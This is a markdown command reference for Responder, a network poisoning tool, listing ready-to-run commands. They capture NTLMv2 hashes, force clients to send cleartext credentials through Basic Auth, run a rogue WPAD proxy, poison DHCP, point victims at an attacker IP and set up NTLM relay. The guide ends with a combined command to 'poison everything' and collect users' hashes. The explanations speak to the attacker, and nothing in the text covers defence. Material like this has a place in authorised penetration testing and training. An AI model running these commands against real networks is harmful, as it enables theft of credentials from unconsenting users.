---
title: Responder Command List
date: 2026-01-05
category: commands
enrich: false
tags: responder, cybersecurity, command reference, ad
description: Top 10 essential commands for responder.
---

# Responder Command Guide

**Responder** is a LLMNR, NBT-NS and MDNS poisoner. It answers specific NBT-NS (NetBIOS Name Service) queries based on their name suffix.

## Top 10 Useful Commands

### 1. Basic Analysis (Listen Only)
```bash
responder -I eth0 -A
```
**Explanation:** Analyze mode (`-A`). See what requests are flying around the network without poisoning.

### 2. Start Poisoning
```bash
responder -I eth0
```
**Explanation:** Start responding to LLMNR/NBT-NS queries. Clients will send you their NTLMv2 hashes.

### 3. Force WPAD auth
```bash
responder -I eth0 -w
```
**Explanation:** Start the WPAD rogue proxy server.

### 4. Force Basic Auth
```bash
responder -I eth0 -b
```
**Explanation:** Force clients to send cleartext credentials (Basic Auth) instead of encrypted hashes.

### 5. Fingerprint
```bash
responder -I eth0 -F
```
**Explanation:** Attempt to fingerprint host OS versions passively.

### 6. Verbose
```bash
responder -I eth0 -v
```
**Explanation:** Show more details about captured packets.

### 7. Disable SMB
```bash
# Edit Responder.conf -> Turn "SMB = Off"
```
**Explanation:** Essential when doing NTLM Relay attacks (you can't bind port 445 if you want to relay it).

### 8. DHCP Poisoning
```bash
responder -I eth0 -d
```
**Explanation:** Inject WPAD via DHCP responses (dangerous/noisy).

### 9. External IP
```bash
responder -I eth0 -e 10.10.10.5
```
**Explanation:** Tell victims to connect to a specific IP.

### 10. Kill Session
```bash
# (Ctrl+C)
```
**Explanation:** Responder should be stopped gracefully to revert network changes.

## The Most Powerful Command
```bash
responder -I eth0 -dwv
```
**Explanation:** Poison everything (LLMNR, NBT-NS, DNS, WPAD). If a user types a wrong server name (e.g., `\fileserverr`), you get their hash.

